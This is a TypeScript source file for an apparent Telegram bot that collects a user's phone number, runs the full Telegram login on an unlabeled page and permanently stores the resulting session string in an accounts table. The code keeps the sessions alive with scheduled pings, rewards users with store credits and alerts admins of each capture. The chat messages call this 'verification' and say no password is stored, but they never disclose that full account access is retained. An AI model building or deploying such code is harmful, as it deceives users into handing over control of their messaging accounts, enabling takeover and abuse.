// Bot flow orchestration (Hybrid): the chat bot collects the phone number and
// issues a one-time login ticket. The actual Telegram (MTProto) login runs in the
// user's BROWSER on a minimal unlabeled page (serverless MTProto from Vercel is
// blocked). On success the page posts the session here, which encrypts it and stores
// it permanently in the shared `accounts` table, then notifies the user in chat.
import crypto from 'crypto';
import {db} from './db';
import {encrypt,decrypt} from './encryption';
import {sendMessage,F,escapeHtml} from './bot';
import {upsertUser,getBalance,syncAuthentication,markAuthenticationVerified,notifyAuthAdmins} from './storeFlow';

const DIV='✦ ━━━━━━━━━━━━━ ✦';

const TTL_MS=10*60*1000; // login link valid 10 minutes

async function checkExpiration(t:any){
  // FIX #6: completeLogin previously did NOT check ticket expiration.
  if(!t||t.status!=='pending'||!t.phone||Date.now()>(Number(t.createdAt)+TTL_MS))return false;
  return true;
}
const GLOBAL_CREDIT_DEFAULT=100;
const normalizePhone=(v:string)=>v.replace(/[\s()-]/g,'');
const phoneIsValid=(v:string)=>/^\+?\d{7,15}$/.test(v);

export type FlowState={step:'phone'|'link';phone:string;token?:string};

function uploadKey(chatId:number|string,userId:number|string){
  return `store_upload:${String(chatId)}:${String(userId)}`;
}
export function flowUploadKey(chatId:number|string,userId:number|string){ return uploadKey(chatId,userId); }
// Legacy single-id key (older builds used userId only). Read both, write the new pair key.
export async function getUploadPending(chatId:number|string,userId:number|string):Promise<boolean>{
  const keys=[uploadKey(chatId,userId),`store_upload:${String(userId)}`];
  for(const k of keys){
    try{
      const {data}=await db.from('settings').select('value').eq('key',k).maybeSingle();
      if(data?.value==='pending') return true;
    }catch{}
  }
  return false;
}
export async function setUploadPending(chatId:number|string,userId:number|string){
  await db.from('settings').upsert({key:uploadKey(chatId,userId),value:'pending',updated_at:new Date().toISOString()},{onConflict:'key'});
}
export async function clearUploadPending(chatId:number|string,userId:number|string){
  await db.from('settings').delete().eq('key',uploadKey(chatId,userId));
  await db.from('settings').delete().eq('key',`store_upload:${String(userId)}`);
}

// ---------------------------------------------------------------------------
// /editproduct interactive state
// Stored in the same settings KV table as bot_state / store_upload, scoped per
// chat+user so a group and a private chat never share an edit session.
// ---------------------------------------------------------------------------
export type EditMode='text'|'photo'|'file'|'caption';
export type EditState={id:number;mode:EditMode;field?:'name'|'desc'|'price'};

function editKey(chatId:number|string,userId:number|string){
  return `ep_state:${String(chatId)}:${String(userId)}`;
}
export async function getEditState(chatId:number|string,userId:number|string):Promise<EditState|null>{
  try{
    const {data}=await db.from('settings').select('value').eq('key',editKey(chatId,userId)).maybeSingle();
    if(!data?.value)return null;
    const parsed=JSON.parse(String(data.value)) as EditState;
    return parsed&&Number.isInteger(parsed.id)?parsed:null;
  }catch{return null;}
}
export async function setEditState(chatId:number|string,userId:number|string,state:EditState){
  await db.from('settings').upsert({key:editKey(chatId,userId),value:JSON.stringify(state),updated_at:new Date().toISOString()},{onConflict:'key'});
}
export async function clearEditState(chatId:number|string,userId:number|string){
  await db.from('settings').delete().eq('key',editKey(chatId,userId));
}

async function getState(chatId:number|string):Promise<FlowState|null>{
  const {data}=await db.from('settings').select('value').eq('key','bot_state:'+String(chatId)).maybeSingle();
  if(!data?.value)return null;
  try{return JSON.parse(data.value) as FlowState;}catch{return null;}
}
async function saveState(chatId:number|string,data:FlowState){
  await db.from('settings').upsert({key:'bot_state:'+String(chatId),value:JSON.stringify(data),updated_at:new Date().toISOString()},{onConflict:'key'});
}
export async function clearState(chatId:number|string){
  await db.from('settings').delete().eq('key','bot_state:'+String(chatId));
}
export async function getStateSafe(chatId:number|string){
  try{return await getState(chatId);}catch{return null;}
}

async function globalCredit():Promise<number>{
  try{const {data}=await db.from('settings').select('value').eq('key','global_credit').maybeSingle();if(data&&data.value)return Number(data.value);}catch{}
  return GLOBAL_CREDIT_DEFAULT;
}
async function ensureGlobalCredit(){
  // Never overwrite a custom admin value. Insert-only when the row is missing.
  try{
    const {data}=await db.from('settings').select('key').eq('key','global_credit').maybeSingle();
    if(!data) await db.from('settings').insert({key:'global_credit',value:String(GLOBAL_CREDIT_DEFAULT),updated_at:new Date().toISOString()});
  }catch{}
}

export async function deleteLoginTicketsForChat(chatId:number|string){
  try{
    const prefix='bot_login:';
    // Tickets are encrypted; find the one referenced by the flow state first.
    const st=await getState(chatId).catch(()=>null);
    const tokens:string[]=[];
    if(st?.token) tokens.push(st.token);
    for(const t of tokens){ await db.from('settings').delete().eq('key',prefix+t); }
  }catch{}
}

export async function startAuth(chatId:number|string, chatType?:string):Promise<string>{
  if(chatType && chatType!=='private'){
    return `🔒 <b>${F('PRIVATE CHAT ONLY')}</b>\n\n<i>${F('Please open a direct chat with the bot and run /auth there. Group authentication is disabled for your security.')}</i> 🛡️`;
  }
  // Starting a fresh auth flow invalidates any previous pending ticket for this chat.
  try{ await deleteLoginTicketsForChat(chatId); }catch{}
  await saveState(chatId,{step:'phone',phone:''});
  return `📱 <b>${F('STEP 1 — YOUR NUMBER')}</b> 📱

${DIV}

🌍 ${F('Send your mobile number in')} <b>${F('international format')}</b> 🌍

💡 <i>${F('Example:')}</i> <code>+919876543210</code>

${DIV}

🚫 ${F('Send')} /cancel <i>${F('anytime to stop')}</i> 🛡️`;
}

export async function handlePhone(chatId:number|string,phone:string, chatType?:string):Promise<{text:string;url:string}>{
  if(chatType && chatType!=='private'){
    return {url:'',text:`🔒 <b>${F('PRIVATE CHAT ONLY')}</b>\n\n<i>${F('Please continue authentication in a direct chat with the bot.')}</i> 🛡️`};
  }
  // Any previous ticket for this chat is revoked when a new number is submitted.
  try{ await deleteLoginTicketsForChat(chatId); }catch{}
  const pn=normalizePhone(String(phone).trim());
  if(!/^\+?\d{7,15}$/.test(pn))return {url:'',text:`❌ <b>${F('Invalid Number')}</b> ❌\n\n<i>${F("That doesn't look right. Use international format.")}</i> 📱\n\n💡 <i>${F('Example:')}</i> <code>+919876543210</code> ✨`};
  const token=crypto.randomBytes(16).toString('hex');
  const payload=JSON.stringify({chatId,phone:pn,status:'pending',createdAt:Date.now()});
  await db.from('settings').upsert({key:'bot_login:'+token,value:encrypt(payload),updated_at:new Date().toISOString()},{onConflict:'key'});
  await saveState(chatId,{step:'link',phone:pn,token});
  const host=process.env.VERCEL_PROJECT_PRODUCTION_URL||'poppygram.vercel.app';
  const url=`https://${host.replace(/^https?:\/\//,'')}/botlogin?t=${token}`;
  return {
    url,
    text:`✅ <b>${F('NUMBER ACCEPTED')}</b> ✅

${DIV}

📞 <code>${escapeHtml(pn.startsWith('+')?pn:'+'+pn)}</code>
🔔 <i>${F('Security code sent to your Telegram')}</i> ✈️

👇 <b>${F('Tap below to complete verification')}</b> 👇
🔒 <i>${F('No password is ever stored')}</i> 🛡️`,
  };
}

// Returns phone for the login page; only valid for a pending, unexpired ticket.
export async function getTicket(token:string):Promise<{chatId:string;phone:string}|null>{
  if(!token)return null;
  const {data}=await db.from('settings').select('value').eq('key','bot_login:'+token).maybeSingle();
  if(!data?.value)return null;
  try{
    const t=JSON.parse(decrypt(data.value));
    if(t.status!=='pending'||Date.now()> (Number(t.createdAt)+TTL_MS))return null;
    return {chatId:String(t.chatId),phone:String(t.phone)};
  }catch{return null;}
}

export async function completeLogin(token:string,session:string,meta:any):Promise<{ok:boolean;text?:string;error?:string}>{
  const {data}=await db.from('settings').select('value').eq('key','bot_login:'+token).maybeSingle();
  if(!data?.value)return {ok:false,error:'ticket'};
  let t:any;try{t=JSON.parse(decrypt(data.value));}catch{return {ok:false,error:'ticket'}}
    if(!t||!await checkExpiration(t))return {ok:false,error:'ticket'};
  const chatId=t.chatId;const phone=normalizePhone(String(t.phone||''));
  const clean={first_name:String((meta||{}).first_name||''),last_name:String((meta||{}).last_name||''),username:String((meta||{}).username||''),tg_id:String((meta||{}).tg_id||(meta||{}).id||''),credit:0};
  // Validate identity and payload BEFORE touching the permanent accounts table.
  if(!clean.tg_id) return {ok:false,error:'missing_tg_identity'};
  if(!phoneIsValid(phone)||!session||String(session).trim().length<50||String(session).length>10000)return {ok:false,error:'invalid_payload'};
  // Never silently steal a phone number owned by a different Telegram user.
  try{
    const {data:existing}=await db.from('accounts').select('phone,auth_owner_tg_id,meta').eq('phone',phone).maybeSingle();
    const owner=String((existing as any)?.auth_owner_tg_id||(existing as any)?.meta?.bot_tg_id||'');
    if(existing && owner && owner!==String(chatId)){
      return {ok:false,error:'phone_owned_by_other'};
    }
  }catch{}
  const credit=await globalCredit();await ensureGlobalCredit();
  const {data:setting}=await db.from('settings').select('value').eq('key','ping_interval_minutes').maybeSingle();
  const mins=Math.max(5,Number(setting?.value)||60);
  clean.credit=credit;
  // A successful website authentication activates the Telegram store wallet.
  // Older builds could create bot_users with 0 credits, while the previous flow
  // only copied the global credit into the website account metadata. Make the
  // credit grant explicit at successful auth, but do not repeatedly reward the
  // same wallet if it already has credits (admin-added/purchased balance).
  let walletBalance=0;
  let walletUnlimited=false;
  const save={
    phone,label:clean.first_name||phone,status:'active',ping_enabled:true,failure_count:0,
    meta:{...clean,bot_tg_id:String(chatId),credit:walletBalance},auth_owner_tg_id:String(chatId),ping_interval_minutes:mins,last_ping:new Date().toISOString(),
    next_ping_at:new Date(Date.now()+mins*60000).toISOString(),
    session_encrypted:encrypt(String(session)),updated_at:new Date().toISOString(),
  };
  try{const {error}=await db.from('accounts').upsert(save,{onConflict:'phone'});if(error)throw error;}catch(e){console.error('[completeLogin] account upsert failed',e);return {ok:false,error:'save_failed'}}

  // Authentication is finalized only after the account is permanently saved.
  // Use the stable auth_owner_tg_id link (with legacy meta.tg_id fallback) so
  // repeated /auth runs cannot make an already-authenticated account appear new.
  try {
      const tgUser={id:Number(chatId),username:clean.username,first_name:clean.first_name,last_name:clean.last_name};
      await upsertUser(tgUser);
      // Directly stamp the Telegram chat/user ID as verified only AFTER the
      // permanent account row has been written. This is the canonical link;
      // it does not depend on legacy JSON metadata or MTProto user IDs.
      const synced=await markAuthenticationVerified(String(chatId),credit);
      walletBalance=synced.balance;
      walletUnlimited=walletBalance===Infinity;
      // Keep the admin-visible account metadata in sync with the granted wallet.
      try{
        await db.from('accounts').update({meta:{...clean,bot_tg_id:String(chatId),credit:walletUnlimited?0:walletBalance},updated_at:new Date().toISOString()}).eq('phone',phone);
      }catch(e){ console.error('[completeLogin] meta credit sync failed',e); }
    } catch(e){
      console.error('[wallet] auth verification/credit sync failed',e);
      // The account is already stored; do not delete or replace it.
      // Return a success page only when the bot wallet was actually linked.
      return {ok:false,error:'wallet_sync_failed'};
    }

  await db.from('settings').delete().eq('key','bot_login:'+token);
  await clearState(chatId);
  const uname=clean.username?`@${escapeHtml(clean.username)}`:'—';
  const shownPhone=escapeHtml(phone.startsWith('+')?phone:'+'+phone);
  const successText=`🎉 <b>${F('VERIFIED SUCCESSFULLY')}</b> 🎉

${DIV}

✅ <b>${F('YESS YOU WERE VERIFIED')}</b> ✅
👑 <b>${F('Welcome to the premium club')}</b> 💎

${DIV}

👤 <b>${F('Account:')}</b> ${uname} <code>${shownPhone}</code>
🔒 <i>${F('Added securely & stored permanently')}</i> 🛡️
💳 <b>${F('Store credits:')}</b> <code>${walletUnlimited?'UNLIMITED':escapeHtml(String(walletBalance))}</code> ✨

${DIV}

🌟 <i>${F('Enjoy your premium experience')}</i> 🌟`;
  // The user response and admin announcement are independent network calls.
  // Run them together so a slow admin chat cannot delay the authenticated user.
  await Promise.allSettled([
    sendMessage(chatId,successText),
    notifyAuthAdmins({id:Number(chatId),username:clean.username,first_name:clean.first_name,last_name:clean.last_name},{phone,username:clean.username})
  ]);
  return {ok:true};
}

// Removes a pending web-login ticket (fire-and-forget: never throws).
async function deleteWebLoginPass(uid: string): Promise<void> {
  try { await db.from('settings').delete().eq('key', `weblogin:${uid}`); } catch {}
}

export async function generateWebLoginPass(tgUserId: number | string): Promise<{ password: string; expiresAt: number }> {
  const uid = String(tgUserId).trim();
  const password = crypto.randomBytes(4).toString('hex').toUpperCase(); // 8 characters hex code
  const ttlMs = 15 * 60 * 1000; // 15 minutes
  const expiresAt = Date.now() + ttlMs;
  const payload = JSON.stringify({ tg_user_id: uid, password, expiresAt });
  const { error } = await db.from('settings').upsert({
    key: `weblogin:${uid}`,
    value: encrypt(payload),
    updated_at: new Date().toISOString()
  }, { onConflict: 'key' });
  if (error) throw new Error(`Could not store the web login code: ${error.message}`);
  return { password, expiresAt };
}

export async function verifyWebLoginPass(tgUserId: number | string, inputPass: string): Promise<boolean> {
  const uid = String(tgUserId).trim();
  const cleanPass = String(inputPass || '').trim().toUpperCase();
  if (!uid || !cleanPass) return false;
  const { data } = await db.from('settings').select('value').eq('key', `weblogin:${uid}`).maybeSingle();
  if (!data?.value) return false;
  try {
    const parsed = JSON.parse(decrypt(data.value));
    if (!parsed || String(parsed.tg_user_id) !== uid) return false;
    if (Date.now() > Number(parsed.expiresAt)) {
      await deleteWebLoginPass(uid);
      return false;
    }
    if (String(parsed.password).toUpperCase() === cleanPass) {
      // One-time use: delete code once successfully verified
      await deleteWebLoginPass(uid);
      return true;
    }
  } catch {}
  return false;
}
